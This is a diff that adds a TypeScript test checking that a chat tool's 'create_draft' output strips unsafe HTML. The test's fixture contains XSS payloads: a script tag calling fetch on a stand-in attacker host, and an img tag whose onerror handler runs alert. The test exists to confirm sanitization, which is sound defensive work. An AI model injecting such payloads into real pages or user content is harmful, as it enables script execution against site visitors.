@@ -310,6 +310,21 @@ describe('approval policies', () => {
     }
   });
 
+  it('files the page create_draft saved as the draft keeps it: cleaned (CHAT-06)', () => {
+    const draft = CHAT_TOOLS.find((t) => t.name === 'create_draft')!;
+    const made = draft.deliverable!(
+      {
+        title: 'Pricing FAQ',
+        body_html:
+          '<h1>Pricing FAQ</h1><script>fetch("https://evil.example")</script><img src="https://ansvisor.com/a.png" onerror="alert(1)">',
+      } as never,
+      FIXTURE_IDS.brand,
+    )!;
+    expect(made.body).not.toMatch(/<script/i);
+    expect(made.body).not.toMatch(/onerror/i);
+    expect(made.body).toContain('<h1>Pricing FAQ</h1>');
+  });
+
   it('says where every row that takes a brand or an object finds its brand', () => {
     const problems = CHAT_TOOLS.flatMap((tool) => {
       const fields = Object.keys(tool.inputSchema.shape);
